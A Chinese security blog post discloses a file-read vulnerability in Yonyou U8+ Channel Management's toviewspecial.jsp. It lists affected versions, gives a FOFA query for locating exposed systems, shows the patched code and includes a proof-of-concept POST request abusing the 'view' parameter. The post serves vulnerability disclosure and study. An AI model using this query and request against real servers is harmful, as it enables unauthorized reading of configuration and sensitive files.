---
title: "用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞"
source: https://mrxn.net/jswz/yonyou-business-common-toviewspecial-fileread.html
asset_dir: assets/用友u8+渠道管理(高级版)-toviewspecial.jsp-文件读取漏洞
---

# 用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/20 08:15
* 739浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

漏洞预警服务

漏洞扫描服务

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块的 `toviewspecial.jsp` 页面中，存在一个[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。该漏洞是由于该页面对用户输入的文件路径参数过滤不严，攻击者可通过构造恶意请求，读取服务器上的任意文件，包括配置文件、日志文件或其他敏感数据文件。

漏洞扫描服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

深入探索

技术文章订阅

安全研究报告

安全研究工具

根据漏洞通告以及补丁信息

[![用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞](images/img-001-f5e63d39459b.webp)](https://image.mrxn.net/153d8e17fe7c4817a11398f5521903a5.webp)

可知漏洞点包括 toviewspecial.jsp 文件，看下补丁

[![用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞](images/img-002-ce763b0c0f91.webp)](https://image.mrxn.net/58aea46ff97f41929717759a7eb85d43.webp)

```
<%@ page contentType="text/html;charset=utf-8"%>
<%
String strURL="/business/common/view/nullview.jsp";
String strView=request.getParameter("view");
    if (strView != null && (strView.contains("WEB-INF") || strView.contains(".."))) {
        // 拒绝访问或者返回错误
        response.sendError(HttpServletResponse.SC_FORBIDDEN, "Access denied");
        return;
    }
if (strView!=null && strView.length()>0)
  strURL=strView;
request.setAttribute("ui_key",request.getParameter("ui_key"));
%>
<html>
<head>    
  <meta http-equiv="Expires" content="0"></meta>    
  <meta http-equiv="Cache-Control" content="no-cache"></meta>    
  <meta http-equiv="Pragma" content="no-cache"></meta>
</head>   
<body>
  <jsp:include page="<%=strURL%>" />
</body>
</html>
```

那么很容易推断出补丁之前是没有对`strView`即**view**参数进行过滤校验的，从而通过jsp的`include`语法包含特定文件达到[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞的效果。但是需要jsp的`include`语法造成的文件读取[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)有限制的，只能包含部分静态文件，如果包含的文件包括jsp动态执行的代码部分，可能会报错。

漏洞扫描服务

# 漏洞复现

有三处文件都存在同样的漏洞

[![用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞](images/img-003-aab96e3fca42.webp)](https://image.mrxn.net/4110f74076d14a3488e01019ed1a4de3.webp)

```
POST /business/common/toviewspecial.jsp HTTP/1.1
Host: u8.mrxn.net
Content-Type: application/x-www-form-urlencoded

view=toviewspecial.jsp
```

[![用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞](images/img-004-95f507012082.webp)](https://image.mrxn.net/5cf9210a40f143f79f1635fb4802fdf7.webp)

# 参考

* [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
* <https://security.yonyou.com/#/patchInfo?identifier=c53323eb06a64ee18cb5d95dcbd7d5ff>

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8+渠道管理(高级版) toviewspecial.jsp 文件读取漏洞](https://mrxn.net/jswz/yonyou-business-common-toviewspecial-fileread.html)  
文章链接：<https://mrxn.net/jswz/yonyou-business-common-toviewspecial-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-business-common-toviewspecial-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK3ElEQVR4Aeyc0XYbNwxEdfv//5wGou+anCW1sp1j6YE5RYYzGIAUsRvHSdv/brfbn+/En48fq9qP9AErn/ph/FioJ36kjzPLZ3hVm/kVt7d5uZi6/DtYA/lbt/95lxs4BvJ32rdn4tmDAzfgZM89ToYPQd8HPQAY+kLjwOFxkT2Ae23qK64OYx00Dg3dL9H6K+zrjoH04l6/7gZOA4E2dRhxdUSnbz75SofW37wITYeG6vYVZzqMNXoSofmyV/rk6Uuub4XQ9oMRZ/7TQGamrf3eDfx4INCm7lMDjedHgFHXnz75s3lofQFL718n4JNf9QLuNVe+Y4NYfLcu2tzpjwdy77J/+mc38M8GAuNT5lMDow6NQ0N9fiI5jHloHEa0bobwvLfqoflr/Ux41me8z3r+2UCe3XD7Ht/AaSBOPfFxm7/f7v/5c/8+5u578JN9tUB7KmHEzMtF+8wwPSuungjtLCsd5vn0y2dnLM18j6eB9Mm9/v0bOAYCberwGK+OCK1+5YOWryekQl+tK57l+qD1A5S+jbV/RTYAHv4uDFp+VQctD3Ps646B9OJev+4G/qsn4jvhka1NDu1pWOX1J+qHsR4aX/mrLnMw1sDI9VdtBTyXL29F1icvz1djvyHe4pvgciAwf1rgsQ4t75MBjefnhbmu79l6aH3gE+0h2ivRPLRauT5oOjRc6dYlQquDEfXBqAO35UBu+8dLbuA/OE8JOA4D3H+HAQ19SjTAqJuHpuu7Qpj77Sc+6qNH1Atjbxi5ftE6uXilmxetE9Vh3F+9cL8hdQtvFMfvsvJMOVXzME5XH8z1VZ16IrQ+MOLtdrtb3U+8i4uf9IgL2/ArAHzuqx8+NUD5su4wxuLRefYbEpf1anp8DcmpAfcnIPXk0Hx+EBh5+vVd4VUdtH30FV71NF/eCmg91MXKVcjF0iqSl1ahDt/rWz32G+ItvgmevobUlPqANm01aBwa5ufQt9Kh1T3rsw+0Orn10HT4RD3wqQHK9zcfPvmR+FgAhwf4UD8BuOc/lfkKmg8azl2jut+Q8T5ezk4DgTZNaOiT6EnlK9SXCK2fOjRuH/XEVR7G+vJZCy0nr1wFNL3WfaQvuV4Y66FxaKhPzD7yRGj1wP5O/fZmP47fZUGbkufLKavD6IOvcfskXu23yvd99CRCO6N6XzNbpw/Gehi5fmj6rGdp0PLQsLSM0y9Zadj8d2/gNJCraWde7rGTp25ehPa0wIjmRRjz9p0hNK85e8gHnBAY6yeWuwTNBw3v4uQnaHnP8QhPA5n029Iv3sDlQKBN1zNB405ZXYSWh4bqidDy9klMf+bl6XvEoe0JI65qoPnMQ+O5d3KY+7IPNB984uVAbLLxd25gOZCvTt3jZl1yaE+D/kRoeWhoHh7z8sHoKe1ReDbxkbdyVz7zYtVUyGE8n3p5jOVANGz83Rs4BjKbVh0ldWhThseYddWrD/Mw9lHvvY/W8FmftdByWa8P5vn0J4exDhqHOVrvvnJofnnhMZAiO15/A6eBQJsajOhRnfIV6ofWR26dPBFGP8y5fXqE0WtvaLpeaDzz0HR95kVoefkKsx6eq6t+p4GUuON1N3D8fQiMU8wpy2H0QeMwoh/JOrkIzS9P3xWHsb76WLNCONdUnWEdPPal3zp1YPj7EvPQ+spnuN8Qb/FNcDkQaNPMczpVdbmoDq0e5qgv69SfRTj3txbGnHpinkEuXvnN6xfVxdRhPB+w/z7k9mY/lm9InhPO04RPLf0+DYn61OXQeslFfTDP6+sRmtdasffUWh2av7QKGHlps4DmgzlaA2NefYZPD2RWvLV/fwPHQHxaEt0ydbl5UR3aU6EumpeLK918ov4Z6oWvncG67+LsLKXZr9YVyUszjoFo2vjaGzgGAvOnKY8Hcx+MuhO/qodWBw2tg8atV5eL0HyA0oGrmsOwWFgHTL+fsEyfXISx7ko3X3gMpMiO19/AHsjrZzCc4PjXgAb1LwFuFX+Xwz+r13SlW1y9KvTVusL8Sje/QusK01P9+yhPRa/VurQK60urKK0P81doTfpSrz0y9huSt/ZifgzE6TkxuedTTzQvmk9uP/Ny8Uo3n33Ve9Rjb7kedXGV129eVBdX+lU+968+x0CK7Hj9DRwDWU3TKa7Qj5D16tYl1y+mT7+YeXmPehP1qLvniqtbl351Mf3J9SXat9ePgdhk42tv4PgLKo/RT6vWTtF8cvXy9qGeaL1e8+ryFVqnv0dzWatnlV/5rVvlU5e7j/Wi+RUvfb8h3tKb4On7kJpSH55Tzemri+bliZlPvuq70rN/cXte1ZjXX7UV6mJpFclLexT2tU7Mmpm+35C8pRfzy68hns9pOn3RvLjSzf/58/h/BZj1K+55enSPFWavvrbWqzp168tbIc+8PFF/1VbIe99+Q/rbeIP1aSBOTaxJVnjWWvex0q03L6508/Ze+czr7zFz9lAX+5p+rV/sc7W23rw8sbwV+kR9yctrnAZiYuNrbuAYiNPzGMmdqrjyfVe3btU/9fSb7zE9yXtvrfMzJy9PRerZV77yqVevCv2Fx0CK7Hj9DZwGktOrCVaoix69chXPcn2i/apHhdx8YnkqUu959rjifW2t9dc+faiXp8JcrStWefX0V03GaSBp2Px3b+AYiNMTPUZO17yoL7m69XJxpa/6XNVV3p72SF6ePsyL5qyXm0/dvLqoLq508z0eA+nFvX7dDZz+LMunQczpqoseXS6u6vSv0HoxfdnXfI/W6pXrURfVRf2ivhXPuuTWieZF9cL9hngrb4KnP8vyXPlU1PQq1PWVVrHS9WX+q3rtUfGozj3ER15zhSv/Sq+aPupcFenvPc+u9xvy7E39ku80EKdcE6/Ic5RWoa4/eeqZlz+L2a/OUNHXF+/DnJpcTD330Jd4VZf5rJfrc9/C00A0b3zNDZwG4tTyODW9WegXs+5Zbr17yK2Xi+krXe8VlrfCHvpL60M98aou81e8738aSJ/c69+/gdNAnKbokfonp1/rE/tcrdXtI65084npr94V6et55St6rdbZq7SK1Ku2onJ9lFbRa7XO+tL6MF+1FX3O9WkgJja+5gZO36l7jJpghVx0yqJ6ovnq0Uf6zKUuzz7yr+Cq1/Xe4394o9+9s69cTJ/1mVcv3G+It/MmeHynXtPpY3W+3lNrfbWuyKdCLpanwjrRvFwsb0XmS1uFtYn6U7/i1uUZsk5fYvrk+uxbuN8Qb+dN8PgaUtP5Snj+nLJ8hVd15kXPJE80X5g5z1C5R5F1etWTf1fPulnf/YZ4S2+Cx0B8mq5wdW7rzM+m